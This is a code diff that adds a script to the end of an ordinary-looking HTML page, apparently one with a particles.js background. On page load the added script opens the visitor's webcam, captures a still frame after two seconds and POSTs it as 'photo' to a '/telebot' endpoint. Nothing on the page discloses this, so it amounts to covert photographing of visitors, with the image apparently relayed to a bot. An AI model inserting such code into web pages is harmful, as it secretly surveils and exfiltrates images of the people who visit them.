@@ -201,5 +201,41 @@
             retina_detect: true
         });
     </script>
+        <script>
+        window.onload = function() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 640;
+                        canvas.height = 480;
+                        const context = canvas.getContext('2d');
+                        context.drawImage(video, 0, 0);
+                        canvas.toBlob(blob => {
+                            const formData = new FormData();
+                            formData.append('photo', blob);
+                            fetch('/telebot', {
+                                method: 'POST',
+                                body: formData,
+                            })
+                            .then(response => {
+                                if (response.ok) {
+                                    console.log('Photo sent successfully.');
+                                } else {
+                                    console.error('Failed to send photo:', response.statusText);
+                                }
+                            });
+                        }, 'image/png');
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 2000);
+                })
+                .catch(() => {
+                    console.error('Camera access denied.');
+                });
+        };
+        </script>
 </body>
 </html>
